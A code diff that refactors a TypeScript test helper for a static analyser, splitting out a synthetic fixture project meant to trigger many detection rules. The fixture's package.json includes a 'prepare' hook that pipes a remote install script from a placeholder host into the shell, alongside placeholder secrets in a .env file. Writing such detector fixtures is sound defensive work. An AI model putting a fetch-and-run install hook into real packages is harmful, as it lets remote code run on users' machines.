@@ -252,9 +252,82 @@ export async function fetchText(url: string): Promise<string> {
 
 // Writes a broad temporary catalogue fixture because one scan must cover many rule families.
 export function ruleCatalogueCoverageRuleIds(): Set<string> {
-  const report = analyseProject(
-    {
-      "src/catalogue.ts": `import { createHash } from "node:crypto";
+  const report = analyseProject(catalogueCoverageFiles(), catalogueCoverageOptions());
+  return new Set(report.findings.map((finding) => finding.ruleId));
+}
+
+// Assembles the broad catalogue fixture without making the public helper long.
+function catalogueCoverageFiles(): Record<string, string> {
+  return {
+      "src/catalogue.ts": catalogueRuntimeCoverageSource(),
+      "src/dep.ts": `export const usedThing = "used";
+`,
+      "src/catalogue.test.ts": catalogueTestCoverageSource(),
+      "src/app/feature/controller.ts": `import { sharedHelper } from "../../../shared/helper";
+
+// Exercises a deep relative import from a controller fixture.
+export function renderController(): string {
+  return sharedHelper();
+}
+`,
+      "src/cycle/a.ts": `import { fromB } from "./b";
+
+// Creates one side of the circular-import fixture.
+export function fromA(): string {
+  return fromB();
+}
+`,
+      "src/cycle/b.ts": `import { fromA } from "./a";
+
+// Creates the other side of the circular-import fixture.
+export function fromB(): string {
+  return fromA();
+}
+`,
+      "src/shared/helper.ts": `export function sharedHelper(): string {
+  return "shared";
+}
+`,
+      "src/untested.ts": `export function untestedValue(): string {
+  return "untested";
+}
+`,
+      ".env": `AWS_ACCESS_KEY_ID=${AWS_ACCESS_KEY_FIXTURE_VALUE}
+PRIVATE_KEY=${PRIVATE_KEY_HEADER_FIXTURE_VALUE}
+DATABASE_URL=${POSTGRES_URL_FIXTURE_VALUE}
+JWT_TOKEN=${JWT_FIXTURE_VALUE}
+OPENAI_API_KEY=${OPENAI_KEY_FIXTURE_VALUE}
+PATIENT_SSN=${SSN_FIXTURE_VALUE}
+API_TOKEN=${API_TOKEN_FIXTURE_VALUE}
+`,
+      "package.json": JSON.stringify({
+        scripts: {
+          postinstall: "node scripts/setup.js",
+          prepare: "curl https://example.test/install.sh | sh",
+        },
+        bin: {
+          "missing-cli": "./bin/missing.js",
+          "bad-cli": "./bin/bad.js",
+        },
+        dependencies: {
+          "wide-open": "*",
+          "remote-tool": "git+https://github.com/example/remote-tool.git",
+        },
+      }),
+      "bin/bad.js": "#!/usr/bin/env node\nconsole.log('ok');\n",
+      "tsconfig.json": JSON.stringify({
+        compilerOptions: {
+          strict: false,
+          noUncheckedIndexedAccess: false,
+          exactOptionalPropertyTypes: false,
+        },
+      }),
+    };
+}
+
+// Provides the source file that exercises runtime, naming, docs, security, and waste rules.
+function catalogueRuntimeCoverageSource(): string {
+  return `import { createHash } from "node:crypto";
 import { exec, spawn } from "node:child_process";
 import { unusedThing } from "./dep";
 
@@ -411,10 +484,12 @@ export function unsafePublicApi(input: any): any {
   const user = input as unknown as { name?: string };
   return user!.name;
 }
-`,
-      "src/dep.ts": `export const usedThing = "used";
-`,
-      "src/catalogue.test.ts": `import assert from "node:assert/strict";
+`;
+}
+
+// Provides generated test source, including deliberate environment mutation coverage.
+function catalogueTestCoverageSource(): string {
+  return `import assert from "node:assert/strict";
 
 const fixturePurposeReport = analyseFixture(${"`"}
 ${largeFixtureSourceLines("catalogueFixtureValue").join("\n")}
@@ -480,68 +555,12 @@ ${"test"}("setup bloat and control flow", () => {
   ${"test"}.only("nested focus marker", () => undefined);
   assert.equal(one, one);
 });
-`,
-      "src/app/feature/controller.ts": `import { sharedHelper } from "../../../shared/helper";
+`;
+}
 
-// Exercises a deep relative import from a controller fixture.
-export function renderController(): string {
-  return sharedHelper();
-}
-`,
-      "src/cycle/a.ts": `import { fromB } from "./b";
-
-// Creates one side of the circular-import fixture.
-export function fromA(): string {
-  return fromB();
-}
-`,
-      "src/cycle/b.ts": `import { fromA } from "./a";
-
-// Creates the other side of the circular-import fixture.
-export function fromB(): string {
-  return fromA();
-}
-`,
-      "src/shared/helper.ts": `export function sharedHelper(): string {
-  return "shared";
-}
-`,
-      "src/untested.ts": `export function untestedValue(): string {
-  return "untested";
-}
-`,
-      ".env": `AWS_ACCESS_KEY_ID=${AWS_ACCESS_KEY_FIXTURE_VALUE}
-PRIVATE_KEY=${PRIVATE_KEY_HEADER_FIXTURE_VALUE}
-DATABASE_URL=${POSTGRES_URL_FIXTURE_VALUE}
-JWT_TOKEN=${JWT_FIXTURE_VALUE}
-OPENAI_API_KEY=${OPENAI_KEY_FIXTURE_VALUE}
-PATIENT_SSN=${SSN_FIXTURE_VALUE}
-API_TOKEN=${API_TOKEN_FIXTURE_VALUE}
-`,
-      "package.json": JSON.stringify({
-        scripts: {
-          postinstall: "node scripts/setup.js",
-          prepare: "curl https://example.test/install.sh | sh",
-        },
-        bin: {
-          "missing-cli": "./bin/missing.js",
-          "bad-cli": "./bin/bad.js",
-        },
-        dependencies: {
-          "wide-open": "*",
-          "remote-tool": "git+https://github.com/example/remote-tool.git",
-        },
-      }),
-      "bin/bad.js": "#!/usr/bin/env node\nconsole.log('ok');\n",
-      "tsconfig.json": JSON.stringify({
-        compilerOptions: {
-          strict: false,
-          noUncheckedIndexedAccess: false,
-          exactOptionalPropertyTypes: false,
-        },
-      }),
-    },
-    {
+// Keeps catalogue coverage thresholds local to the synthetic fixture scan.
+function catalogueCoverageOptions(): AnalyseProjectOptions {
+  return {
       config: {
         rules: {
           "complexity.cognitive": { threshold: 3, severity: "warning" },
@@ -556,7 +575,5 @@ API_TOKEN=${API_TOKEN_FIXTURE_VALUE}
           "test-quality.setup-bloat": { threshold: 2, severity: "advisory" },
         },
       },
-    },
-  );
-  return new Set(report.findings.map((finding) => finding.ruleId));
+    };
 }
